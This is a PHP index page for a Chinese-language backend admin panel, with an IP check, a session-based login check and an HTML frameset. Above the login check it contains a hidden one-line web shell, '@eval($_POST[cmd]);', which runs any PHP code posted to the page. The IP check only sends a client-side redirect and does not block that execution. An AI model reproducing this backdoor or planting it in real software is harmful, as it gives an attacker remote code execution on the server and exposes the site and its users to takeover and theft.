<?php
if(!empty($_SERVER['HTTP_CLIENT_IP'])){
   $myip = $_SERVER['HTTP_CLIENT_IP'];
}else if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
   $myip = $_SERVER['HTTP_X_FORWARDED_FOR'];
   }else{
   $myip= $_SERVER['REMOTE_ADDR'];
}
$myip = explode(".",$myip);
if($myip[0]!="163" || $myip[1]!="15"){
	echo "<script>top.location.href='../index.php';</script>";
}
$admin=false;
session_start();
@eval($_POST[cmd]);
if (isset($_SESSION["admin"]) && $_SESSION["admin"] == true)
{ 
?>
<html>

<head>
<meta HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
<title>後台管理系統</title>
</head>

<frameset rows="70,*">
	<frame name="top" scrolling="no"  noresize target="contents" src="top.php">
	<frameset cols="20%,*">
		<frame name="contents" target="main" src="left.php">
		<frame name="main" src="memo.php">
	</frameset>
	<noframes>
    </noframes>
</frameset>

</html>
<?php
}
else
{
	 $_SESSION["admin"] = false;
	 echo "<script>top.location.href='login.php';</script>";
   exit();
} 
?>
